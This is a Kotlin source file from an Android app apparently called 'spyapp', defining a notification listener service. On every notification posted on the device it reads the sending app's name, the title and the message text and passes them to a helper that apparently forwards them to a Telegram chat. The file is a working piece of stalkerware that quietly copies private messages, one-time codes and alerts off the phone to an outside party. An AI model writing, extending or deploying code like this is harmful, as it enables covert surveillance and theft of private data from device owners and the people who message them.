package com.hackernight.spyapp

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

class NotificationListener : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        sbn ?: return
        val extras = sbn.notification.extras
        val title = extras.getCharSequence("android.title")?.toString() ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""
        val msg = "🔔 *${sbn.packageName}*\nTitle: $title\nMessage: $text"
        TelegramHelper.sendMessageSmart(this, msg)
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}
}
